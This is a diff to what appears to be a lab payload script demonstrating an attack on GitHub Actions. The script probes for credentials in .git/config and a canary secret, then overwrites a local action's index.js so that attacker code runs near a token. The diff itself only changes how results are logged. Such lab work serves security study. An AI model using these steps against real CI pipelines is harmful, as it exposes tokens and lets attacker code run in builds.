@@ -11,7 +11,7 @@ if [ -z "${LAB_PAYLOAD_RAN:-}" ]; then
     echo "- workspace writable: $(test -w "${GITHUB_WORKSPACE:-/nonexistent}" && echo yes || echo no)"
     echo "- lines matching 'extraheader' in .git/config: $(grep -c extraheader "${GITHUB_WORKSPACE}/.git/config" 2>/dev/null || echo 0)"
     echo "- LAB_CANARY visible to this process: $( [ -n "${LAB_CANARY:-}" ] && echo yes || echo no )"
-  } >> "${GITHUB_STEP_SUMMARY:-/dev/null}"
+  } | tee -a "${GITHUB_STEP_SUMMARY:-/dev/null}"
 
   # Attacker code also sits next to repository files, because the archive was unzipped
   # inside the checkout. Replace the local action's entry point so attacker code runs in
@@ -32,6 +32,7 @@ const lines = [
   ''
 ]
 fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, lines.join('\n'))
+console.log(lines.join('\n'))
 console.log('[payload] fingerprinted the supplied token without printing it')
 JS
     echo "- overwrote \`.github/actions/secret-consumer/index.js\`: yes" >> "${GITHUB_STEP_SUMMARY:-/dev/null}"
